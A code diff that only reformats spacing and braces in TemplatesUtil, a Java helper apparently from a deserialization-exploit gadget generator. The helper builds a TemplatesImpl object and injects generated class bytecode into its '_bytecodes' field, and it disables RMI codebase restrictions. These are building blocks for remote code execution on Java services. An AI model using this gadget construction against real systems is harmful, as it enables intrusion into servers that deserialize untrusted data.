@@ -40,9 +40,9 @@ import ser05j.Reflections;
 /*
  * utility generator functions for common jdk-only gadgets
  */
-@SuppressWarnings ( {
+@SuppressWarnings({
     "restriction"
-} )
+})
 public class TemplatesUtil {
 
   static {
@@ -53,17 +53,19 @@ public class TemplatesUtil {
     System.setProperty("java.rmi.server.useCodebaseOnly", "false");
   }
 
-   public static class StubTransletPayload extends AbstractTranslet implements Serializable {
+  public static class StubTransletPayload extends AbstractTranslet implements Serializable {
 
     private static final long serialVersionUID = -5971610431559700674L;
 
 
     @Override
-    public void transform ( DOM document, SerializationHandler[] handlers ) {}
+    public void transform(DOM document, SerializationHandler[] handlers) {
+    }
 
 
     @Override
-    public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) {}
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
+    }
   }
 
   // required to make TemplatesImpl happy
@@ -73,8 +75,8 @@ public class TemplatesUtil {
   }
 
 
-  public static Object createTemplatesImpl ( final String[] args ) throws ClassNotFoundException, IllegalAccessException, InstantiationException, IOException, CannotCompileException, NotFoundException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException {
-    if ( Boolean.parseBoolean(System.getProperty("upstreamXalan", "false")) ) {
+  public static Object createTemplatesImpl(final String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException, IOException, CannotCompileException, NotFoundException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException {
+    if (Boolean.parseBoolean(System.getProperty("upstreamXalan", "false"))) {
       return createTemplatesImpl(
           args,
           Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
@@ -101,12 +103,11 @@ public class TemplatesUtil {
 
     StringBuilder sb = new StringBuilder();
     boolean first = true;
-    for ( String arg : args ) {
+    for (String arg : args) {
 
-      if ( !first ) {
+      if (!first) {
         sb.append(',');
-      }
-      else {
+      } else {
         first = false;
       }
 
@@ -124,7 +125,7 @@ public class TemplatesUtil {
     final byte[] classBytes = clazz.toBytecode();
 
     // inject class bytes into instance
-    Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
+    Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
         classBytes, ClassFiles.classAsBytes(Foo.class)
     });
 
